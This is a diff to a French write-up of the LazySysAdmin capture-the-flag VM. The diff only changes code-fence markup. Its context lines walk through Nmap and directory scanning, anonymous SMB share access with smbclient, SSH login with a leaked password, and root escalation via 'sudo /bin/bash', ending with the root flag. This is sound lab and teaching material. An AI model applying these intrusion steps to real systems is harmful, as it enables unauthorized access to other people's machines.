@@ -10,14 +10,14 @@ Intro
 
 Pour l'utiliser dans VirtualBox j'ai du convertir l'image disque VMDK vers le format VDI :   
 
-```plain
+```
 VBoxManage clonehd --format VDI Lazysysadmin-disk1.vmdk  Lazysysadmin.vdi
 ```
 
 One for Nmap
 ------------
 
-```plain
+```
 Nmap scan report for 192.168.1.49
 Host is up (0.0020s latency).
 Not shown: 65529 closed ports
@@ -72,7 +72,7 @@ On a ici un SMB, un SSh, un MySQL, un IRC ainsi qu'un serveur Apache exposés. P
 Two for web-buster
 ------------------
 
-```plain
+```
 Starting buster processes...
 http://192.168.1.49/.htpasswd/ - HTTP 403 (289 bytes, plain)
 http://192.168.1.49/.htaccess/ - HTTP 403 (289 bytes, plain)
@@ -95,7 +95,7 @@ Three for anonymous SMB
 
 On utilise l'option -L de *smbclient* pour lister les partages SMB.  
 
-```plain
+```
 $ smbclient -L LAZYSYSADMIN -I 192.168.1.49 -U "" -N
 Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
 
@@ -113,7 +113,7 @@ Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
 
 Puis on tente une connexion au partage share$ en connexion anonyme :   
 
-```plain
+```
 $ smbclient -I 192.168.1.49 -U "" -N '//LAZYSYSADMIN/share$'                
 Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
 smb: \> ls
@@ -177,7 +177,7 @@ Quand on se rend sur le wordpress on note quelques éléments :
 
 Et si on testait le password *12345* vu dans le fichier texte ?  
 
-```plain
+```
 $ ssh togie@192.168.1.49
 The authenticity of host '192.168.1.49 (192.168.1.49)' can't be established.
 ECDSA key fingerprint is SHA256:pHi3EZCmITZrakf7q4RvD2wzkKqmJF0F/SIhYcFzkOI.
@@ -213,7 +213,7 @@ bash: _upvars: `-a0': invalid number specifier
 
 On a donc un shell avec le mot de passe *12345*. L'utilisateur est dans un rbash qui est apparu quand on a voulu utiliser la complétion. Cette info se confirme par cette entrée du fichier *passwd* :  
 
-```plain
+```
 togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash
 ```
 
@@ -221,26 +221,26 @@ Mais pour le moment il ne nous dérange pas plus que ça...
 
 Il y a un utilisateur irc qui fait tourner un démon InspIRCd :  
 
-```plain
+```
 irc       1001  0.0  0.2   6652  5424 ?        Ss   01:29   0:00 /usr/sbin/inspircd --logfile /var/log/inspircd.log --config /etc/inspircd/inspircd.conf start
 ```
 
 Le répertoire correspondant au démon dans /etc n'est pas accessible :  
 
-```plain
+```
 drwxrwx--- 2 irc  irc     4096 Aug 14 20:40 inspircd
 ```
 
 Par contre le fichier de log est accessible aux membres du groupe adm :  
 
-```plain
+```
 togie@LazySysAdmin:~$ ls -l /var/log/inspircd.log
 -rw-r----- 1 irc adm 54782 Oct 21 01:34 /var/log/inspircd.log
 ```
 
 D'ailleurs de quels groupes faisons nous partie ?  
 
-```plain
+```
 togie@LazySysAdmin:~$ grep togie /etc/group
 adm:x:4:syslog,togie
 cdrom:x:24:togie
@@ -257,7 +257,7 @@ On fait partie du groupe *sudo*... Intéressant.
 Five for the root
 -----------------
 
-```plain
+```
 togie@LazySysAdmin:~$ sudo -l
 [sudo] password for togie:
 Matching Defaults entries for togie on LazySysAdmin:
@@ -269,7 +269,7 @@ User togie may run the following commands on LazySysAdmin:
 
 Ce fut rapide !  
 
-```plain
+```
 togie@LazySysAdmin:~$ sudo /bin/bash
 root@LazySysAdmin:~# cd /root
 root@LazySysAdmin:/root# ls
@@ -295,7 +295,7 @@ bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
 
 Au passage dans le fichier de log d'InspIRCd on trouve cela :  
 
-```plain
+```
 <oper name="root"
       password="12345"
       host="*@localhost"
